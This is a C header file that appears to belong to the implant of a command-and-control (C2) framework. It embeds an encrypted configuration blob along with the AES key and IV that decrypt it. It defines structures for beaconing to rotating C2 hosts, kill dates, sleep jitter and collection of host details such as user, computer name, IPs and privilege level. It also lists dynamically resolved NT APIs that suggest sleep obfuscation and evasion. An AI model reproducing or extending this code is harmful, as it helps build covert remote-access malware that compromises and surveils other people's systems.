#pragma once
#include "Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
#define CONFIG_BYTES {0x3c,0xee,0x92,0x82,0xd2,0x32,0x1f,0x60,0x57,0x31,0x84,0x6c,0xe4,0xa8,0x6b,0xa4,0xe2,0xf5,0xa8,0x19,0xc1,0x8c,0x1a,0x02,0x2d,0x1d,0x75,0x29,0x23,0x50,0xd6,0x5a,0x1b,0xdc,0x25,0x27,0x6e,0x27,0x81,0xb2,0xe8,0x82,0x74,0xeb,0x55,0xdd,0x25,0x27,0x4e,0x0e,0xf1,0x77,0x95,0xf3,0xa9,0xe2,0xf7,0xfd,0x46,0x73,0x38,0x8a,0xe1,0x73,0x7b,0xc4,0x82,0xc0,0xc8,0x66,0x49,0x2f,0x67,0xb3,0xbd,0xcd,0xfb,0xcc,0xbd,0x6b,0x53,0x22,0x7b,0xe1,0xf4,0x8c,0x3e,0xea,0x11,0xfa,0x7d,0x7b,0x62,0xea,0xd8,0x70,0xeb,0x03,0x17,0x2e,0x68,0x8e,0xef,0xd2,0xb9,0x48,0x07,0x19,0x89,0x6d,0xea,0x0e,0x9b,0xba,0x78,0xca,0x38,0xf3,0x17,0x16,0xc0,0x14,0xa6,0xd6,0x0b,0xca,0xff,0x3e,0x92,0x05,0x52,0x48,0x2f,0xa1,0x3f,0x9a,0x9c,0x54,0x92,0x3b,0xce,0x24,0xa1,0x10,0x77,0xb2,0xaa,0xae,0x8a,0x30,0xcb,0xfc,0xcc,0xf7,0x70,0x68,0x74,0xf8,0x5d,0x25,0xdc,0xe0,0xe5,0x89,0xae,0x7c,0x3c,0x56,0x6d,0x73,0x5e,0xb4,0x0f,0x4e,0x27,0xd7,0x0b,0x4b,0x43,0xee,0xc3,0xda,0x01,0x68,0xcf,0x3e,0xcf,0xb8,0x12,0xe3,0x55,0xc0,0x2b,0xfa,0x1c,0xcc,0x05,0x72,0x04,0xf4,0x0f,0xad,0x24,0x63,0x26,0x78,0xb5,0x14,0x64,0x09,0xb9,0xe2,0x03,0xe9,0x6b,0x69,0xe9,0x05,0xba,0x70,0xae,0x3c,0x53,0x8e,0x78,0xc6,0x86,0x4a,0x52,0x43,0xf9,0x16,0x54,0xe6,0x7b,0xc6,0xf8,0xe4,0x4d,0xe8,0x72,0xb9,0x95,0xbc,0xb8,0x53,0xff,0x00,0xa1,0x5f,0x48,0xde,0xf9,0xe0,0xe0,0x32,0xc9,0xc4,0xae,0x9a,0x30,0x13,0x4f,0xb7,0x54,0x88,0x47,0x5d,0xc5,0xb2,0xb4,0xf4,0x56,0x32,0x19,0x02,0x64,0x33,0xbe,0x43,0x7a,0x5e,0xc4,0x0e,0x0d,0x3c,0x8e,0x0a,0x81,0x4c,0x78,0x62,0x51,0xba,0x1c,0x03,0x75,0x72,0xaa,0xd0,0x32,0x97,0xd1,0x23,0xf4,0x74,0x0c,0x79,0x51,0xac,0xcb,0x90,0x7e,0x36,0x9b,0x64,0x88,0x43,0x79,0xad,0x9d,0x31,0x02,0x12,0xd3,0x2a,0x05,0xd1,0x12,0xbb,0x5f,0x92,0xb6,0x8e,0xcd,0x31,0xb4,0x24,0x02,0x03,0xa4,0x01,0x49,0x6f,0xe7,0xbc,0x2f,0x47,0x49,0x17,0x27,0x39,0x6d,0x33,0xa3,0x19,0xda,0x94,0x46,0xb3,0x02,0x5f,0x93,0xb1,0xca,0x21,0x07,0x73,0x61,0x8d,0x4b,0x62,0xfc,0xe4,0x5e,0xbc,0x44,0xa1,0x99,0x15,0x80,0xc8,0xe1,0x04,0x3c,0x3d,0xf7,0x83,0x5e,0x6b,0x38,0xd6,0x61,0xe3,0x16,0xd8,0xfb,0xd7,0x90,0xc6,0xb0,0x4f,0x23,0xbf,0x97,0x53,0x19,0x62,0xb5,0x08,0x6f,0xf0,0x2f,0xbd,0xa6,0x25,0xae,0xbf,0x62,0xd1,0x38,0x55,0x89,0x29,0x99,0x26,0x95,0x37,0xbe,0xf4,0xf1,0xb6,0x3c,0x34,0x82,0xa9,0x86,0x87,0x2f,0x5c,0xc3,0xab,0xa9,0xf9,0xd6,0x7c,0x4e,0xc1,0x01,0x44,0x97,0x40,0x14,0x1f,0x53,0x46,0xa3,0x64,0x0d,0xe0,0xda,0xc6,0x38,0x4a,0x0d,0x4d,0xed,0xdc,0x5b,0xf8,0x62,0x8f,0x9f,0xae,0xfa,0xa8,0x1a,0x02,0xb6,0x95,0x53,0x5c,0x1b,0x29,0xa8,0xd6,0x9d,0xdc,0x4b,0x16,0xa8,0x15,0x24,0x68,0xb1,0xb7,0x65,0x90,0xc4,0x0a,0x0f,0xda,0x3c,0x39,0xbf,0x35,0x5c,0x22,0xd0,0x06,0x05,0xab,0xda,0x62,0x1d,0x22,0xe7,0xed,0x97,0x83,0x5f,0x6c,0x0c,0xce,0xe7,0xb0,0xc2,0xdb,0x77,0xf9,0x5d,0x00,0xee,0xbe,0x4f,0x37,0x0b,0x5c,0xb3,0xc7,0x5b,0x21,0x87,0x3b,0xf7,0xe3,0x78,0xd7,0x09,0xd5,0x33,0x75,0x35,0x2f,0xbd,0x98,0xb6,0xaa,0x93,0xa7,0xd2,0x98,0xd7,0xff,0xd9,0xec,0xf3,0xf5,0x77,0x9a,0x76,0xb4,0x2a,0xa8,0x6d,0xb8,0xb9,0x7f,0x81,0x7c,0x29,0x74,0x58,0x77,0x3b,0x08,0x94,0xf0,0x7e,0x78,0x0f,0x84,0xce,0x75,0x57,0xcc,0x17,0xfb,0x9c,0xab,0x99,0x1a,0xce,0x90,0x3b,0x8f,0xc0,0x86,0x12,0x9c,0x6a,0x90,0xc5,0x3f,0xe1,0x9e,0x02,0x3f,0x52,0xe8,0xa5,0xbc,0xeb,0x6b,0xe2,0x27,0x84,0x99,0x3b,0x9d,0x59,0xc8,0xcb,0x22,0x1c,0x86,0x3c,0xa4,0x9e,0x6a,0xda,0x2b,0x51,0xe4,0x51,0x83,0x7e,0xbb,0xb4,0xde,0xa8,0xca,0xcf,0x74,0x20,0x16,0xaf,0x71,0x5e,0xf7,0xd4,0x21,0x04,0xaf,0xa8,0x07,0xee,0x59,0xa2,0x9d,0x07,0xa8,0xd3,0xe3,0x49,0xdb,0x94,0x4a,0xcb,0xa7,0x2a,0x2d,0xea,0xf3,0xb6,0x87,0x14,0x7b,0xfa,0xda,0xbc,0xe5,0xa6,0xab,0xb8,0x65,0x2b,0xae,0x13,0xe7,0x86,0x2c,0x1f,0xf2,0xd1}
#define CONFIG_KEY_BYTES {0x61,0x6d,0x29,0xc8,0x58,0x29,0xd8,0x92,0x1d,0xa2,0xce,0x4c,0xb9,0xbf,0xdd,0xe8,0xb9,0xbe,0x84,0xb5,0x85,0x22,0x88,0xdc,0x0f,0x69,0xb9,0xe0,0xd6,0x3d,0xb1,0xcb}
#define CONFIG_IV_BYTES {0xe5,0xcd,0x32,0xae,0x69,0xe2,0xf8,0x46,0x6c,0x12,0x33,0x07,0x6c,0x69,0x4d,0xd2}
#define HASH_CONFIG_BYTES {0x46,0xe0,0x92,0x5f,0xf3,0x4b,0x9b,0x3c,0x4d,0xed,0xb0,0x25,0xfd,0xb6,0x84,0xe2,0x1a,0x1a,0xae,0x99,0x77,0xf8,0x76,0xeb,0x16,0x76,0xa4,0xfc,0x60,0xd9,0xcf,0x34,0xb6,0x5f,0xe3,0xeb,0x68,0x48,0x82,0xde,0xa5,0x62,0x6e,0x93,0x9e,0xe1,0xce,0xb7,0xe7,0xf2,0x4c,0xf4,0xd5,0xf4,0xfd,0x40,0xcd,0x80,0x62,0xd0,0x55,0xa5,0xc0,0x7a,0xfe,0x95,0x44,0x9e,0x55,0xa7,0xa7,0x4a,0xd6,0xcf,0xbd,0x4e,0xc1,0xda,0xa0,0x4e,0x4c,0x7d,0xb2,0x25,0x84,0xbd,0xb9,0x7a,0x88,0x3e,0x9b,0x70,0xd0,0x45,0x85,0xd5,0xed,0xe2,0xeb,0x2e,0x87,0x0d,0x10,0xb9,0x6f,0x4b,0x9f,0xf1,0x27,0x77,0xb5,0xb4,0xa2,0x5f,0x21,0xd3,0x38,0x14,0x96,0xec,0x61,0x05,0x4f,0xfb,0xc3,0xa1,0xb3,0x03,0xe1,0x58,0x59,0x7c,0xcf,0x46,0x7a,0xe2,0x7a,0x74,0xb7,0x5a,0xa4,0x15,0xdb,0x46,0xbd,0xf3,0x85,0xaf,0x5e,0xe6,0x09,0xec,0xcf,0xe0,0xed,0x54,0x6b,0xb5,0xd7,0xce,0x5c,0x45,0x74,0x2e,0xf4,0x3a,0x8d,0x76,0xab,0xf6,0xa3,0x67,0x46,0xb5,0xed,0x43,0xde,0xcd,0x2a,0xbf,0x9b,0xa6,0x5d,0xee,0xd9,0x2e,0x7c,0x0f,0xb3,0xb5,0x7c,0xc1,0x8e,0x78,0xdd,0x64,0x7a,0x9d,0xa5,0x99,0x97,0x96,0x91,0x8a,0x55,0x20,0x97,0xcd,0x7b,0x7e,0xc4,0xbc,0xbc,0xd6,0xbf,0x64,0xc1,0x5e,0x11,0x81,0xb6,0x03,0xdb,0x06,0xe8,0x50,0xfb,0x61,0x9d,0x9f,0x23,0x37,0x8b,0x1d,0xe0,0xaa,0xd9,0x3c,0x23,0xae,0xf4,0x3f,0x80,0xf0,0x99,0xf8,0x69,0x08,0x67,0x5c,0xca,0xc6,0x9c,0x32,0xf3,0x75,0xc6,0x50,0xd5,0xb4,0xbe,0x60,0x1a,0xb6,0x64,0x1f,0x30,0xf7,0xc6,0x34,0xf7,0x15,0xe9,0x69,0x40,0x75,0xbb,0xc4,0x61,0x7b,0xc4,0xd3,0xdf,0xae,0x85,0xa8,0x43,0x80,0xdf,0xbb,0x0e,0x2a,0xdd,0x77,0xc5,0x1b,0x05,0xb7,0xa7,0xdd,0x5b,0xe7,0x89,0x4d,0xa2,0x2c,0x81,0x7a,0xce,0xc4,0x74,0x09,0x28,0xee,0x99,0xf4,0xd7,0xc2,0x8e,0xa0,0x75,0x26,0x84,0x4a,0x16,0x9d,0x47,0xcb,0x7e,0x35,0x8d,0xb0,0xe6,0xec,0xd9,0x16,0x9d,0x12,0x5c,0xe7,0xaf,0x18,0x7b,0x46,0x9c,0x5d,0x2d,0x0c,0xe2,0x64,0x6d,0x0d,0xc6,0x8f,0xf4,0xa2,0xaa,0x3e,0x3a,0x14,0xbd,0x85,0x7a,0xc4,0x01,0x7e,0x4b,0xac,0xe1,0x5f,0xf0,0xd8,0x01,0xca,0xa8,0xaf,0x3c,0x3b,0xf2,0x93,0x07,0x33,0xfe,0x75,0xb6,0x22,0x44,0x7c,0x60,0xcd,0x8e,0xe2,0x26,0xf5,0x90,0x9d,0xc8,0xda,0xa8,0xc4,0x75,0xc3,0x55,0x96,0xf9,0x8a,0x4e,0x01,0x77,0x3e,0x9a,0x4d,0xe7,0xfe,0xcf,0x96,0x42,0x34,0x8a,0x26,0xfb,0xe4,0x35,0x60,0x6c,0xef,0x66,0xab,0xb6,0x42,0xb4,0xa2,0x68,0x9b,0xdb,0x45,0xd5,0x21,0x52,0x77,0x87,0xd1,0x87,0xda,0x68,0x32,0xe8,0x98,0xa7,0xeb,0x08,0xd3,0xda,0x95,0xb9,0x21,0xa7,0xf2,0x39,0xa5,0xcd,0xb8,0x47,0x10,0x46,0x42,0xdb,0x59,0x52,0x69,0x9c,0x01,0xe0,0xdc,0x30,0x8a,0x4b,0x6d,0xb8,0xfb,0x67}
#define HASH_KEY_BYTES {0x89,0x73,0x55,0xa2,0x87,0x37,0xbb,0xa0,0xfe,0x3a,0x80,0x74,0xdc,0x3c,0x1a,0x9a,0x81,0xaa,0x5a,0x40,0x49,0xf9,0x44,0xb6,0xb4,0x5d,0xaa,0x26,0x82,0xef,0x99,0xf0}
#define HASH_IV_BYTES {0x11,0x9b,0xd6,0xbb,0xfe,0x1d,0x2c,0x72,0xe8,0x0d,0x2b,0x96,0xab,0x3d,0x79,0x75} 

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;



typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

//TODO FINISH ADDING LISTENER / AGENT CONFIG DATA/
typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;
	t_RtlCreateTimerQueue pRtlCreateTimerQueue;
	t_NtCreateEvent pNtCreateEvent;
	t_RtlCaptureContext pRtlCaptureContext;
	t_RtlCreateTimer pRtlCreateTimer;
	t_RtlRegisterWait pRtlRegisterWait;
	t_RtlDeleteTimerQueue pRtlDeleteTimerQueue;
	t_RtlCopyMappedMemory pRtlCopyMappedMemory;
	t_NtWaitForSingleObject pNtWaitForSingleObject;
	t_NtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject;
	t_NtContinue pNtContinue;
	t_NtSetEvent pNtSetEvent;
	t_NtSetContextThread pNtSetContextThread;
	t_NtDuplicateObject pNtDuplicateObject;
	t_LdrGetProcedureAddress pLdrGetProcedureAddress;
	t_NtQueryVirtualMemory pNtQueryVirtualMemory;


	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;
	t_VirtualProtect pVirtualProtect;
	t_WaitForSingleObjectEx pWaitForSingleObjectEx;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;
	t_SystemFunction032 pSystemFunction032;
	HMODULE hCryptSp;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

} Win32, * pWin32;

typedef struct _AgentCMD {
	UINT CommandID;
	UINT RequestID;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {


	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;

	//active threads
	BOOL ActiveThreads;

	//ImageBase Address
	PVOID ModuleBaseAddr;

	//Image Size
	DWORD ImageSize;

	//Number of Sections
	DWORD NumSections;

	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;


}Agent, * pAgent;


extern pAgent agent;

enum Agent_Operations {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
};


INT init_agent();
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();